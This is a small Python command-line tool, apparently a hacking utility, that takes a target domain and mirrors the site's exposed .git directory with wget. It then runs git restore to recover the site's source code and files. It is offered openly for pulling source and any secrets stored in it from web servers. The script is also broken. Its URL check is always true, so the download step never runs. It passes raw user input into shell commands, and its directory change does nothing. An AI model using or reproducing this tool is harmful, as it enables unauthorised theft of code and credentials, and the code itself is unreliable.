#.git expose
#coded by ./vend3tta
from time import sleep
import os
from colorama import Fore


def strtr():
    os.system("clear" if os.name == 'posix' else "cls")
    print(Fore.LIGHTCYAN_EX+'''
╔╦╗╔═╗╔╦╗ ╔═╗╦╔╦╗
 ║║║ ║ ║──║ ╦║ ║ 
═╩╝╚═╝ ╩  ╚═╝╩ ╩ 
.git file identifier and downloader
          
''')
def target():
    strtr()
    targt = input('Enter URL (without https or http): ')
    while 1:
        if "https" or "https://" or "http" or "http://" in targt:
            print("[*] Incorrect target format! ")
            sleep(2)
            strtr()
        else:
            print("[*] Starting to download all target files, source codes, etc.")
            os.system(f"wget --mirror -I .git https://{targt}/.git/")
            print("[*] This may take a few minutes...")
            sleep(1)
            print("[]")
            os.system(f"cd {targt}")
            os.system(f"git status")
            os.system("git restore .")
            sleep(2)
            print("[*] Done! you can view all the contents of the target")
            exit()
target()



